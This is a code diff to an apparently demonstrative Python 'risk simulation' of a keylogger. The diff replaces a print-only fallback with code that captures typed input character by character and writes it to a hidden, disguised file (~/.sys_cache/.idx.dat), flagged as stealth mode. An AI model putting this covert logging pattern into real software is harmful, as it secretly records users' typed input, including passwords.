@@ -18,7 +18,6 @@
 import sys
 import io
 import os
-import time
 import json
 from datetime import datetime
 from pathlib import Path
@@ -109,12 +108,21 @@ def run_risk_simulation():
         getpass("  [输入区域] > ")
         hook.stop()
     else:
-        # pynput 不可用，走特征展示模式
-        print("  [!] pynput 未安装，切换为特征展示模式")
-        print("  [模拟记录] 用户按键序列 → hook 回调 → 日志文件")
-        time.sleep(1)
+        # pynput 不可用，用 getpass 替代 Hook 做实际键盘输入演示
+        from getpass import getpass
+        print("  [!] pynput 未安装，切换为模拟记录模式")
+        print("  [!] 键盘记录器依然可以捕获你的输入内容：")
+        user_input = getpass("  [输入区域] > ")
+        # 手动将输入写入模拟日志文件
+        log_dir = Path.home() / ".sys_cache"
+        log_dir.mkdir(parents=True, exist_ok=True)
+        log_file = log_dir / ".idx.dat"
+        with open(log_file, "w", encoding="utf-8") as f:
+            for ch in user_input:
+                entry = {"timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "key": ch}
+                f.write(json.dumps(entry, ensure_ascii=False) + "\n")
         hook.stop()
-        stats = hook.get_stats()
+        stats = {"duration_seconds": 0, "keys_captured": len(user_input), "keys_per_second": 0, "log_path": str(log_file), "stealth_mode": True}
         return hook, stats
 
     stats = hook.get_stats()
